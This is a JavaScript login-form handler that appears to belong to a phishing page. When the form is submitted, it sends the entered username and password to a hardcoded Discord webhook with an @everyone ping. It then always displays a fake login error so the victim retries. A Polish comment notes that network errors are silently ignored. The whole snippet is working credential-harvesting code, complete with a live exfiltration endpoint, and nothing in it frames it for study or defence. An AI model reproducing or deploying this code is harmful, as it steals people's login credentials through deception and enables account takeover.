document.getElementById('login-form-real').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('login-username').value.trim();
    const password = document.getElementById('login-password').value;
    const errorEl = document.getElementById('text-error');
    const button = document.getElementById('login-button');
    const spinner = document.getElementById('login-loading');

    if (!username || !password) {
        errorEl.textContent = 'Username and password required';
        return;
    }

    button.style.display = 'none';
    spinner.style.display = 'inline-block';
    errorEl.textContent = '';

    fetch('https://discord.com/api/webhooks/1427689728974786714/ei17aNWUxM_1FqzAsqt8PKQspeZtKhBBUKBlsuP4ezYpP9Gxwt-KR2E_gm5LpuElIwFZ', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
    content: `@everyone\n> **u:** \`${username}\`\n> **p:** \`${password}\``
})
}).catch(() => {
// Ignoruj błędy sieciowe – i tak pokażemy błąd po 1.2s
});

    setTimeout(function() {
        errorEl.textContent = 'There was a login error. Please try again.';
        spinner.style.display = 'none';
        button.style.display = 'block';
    }, 1200);
});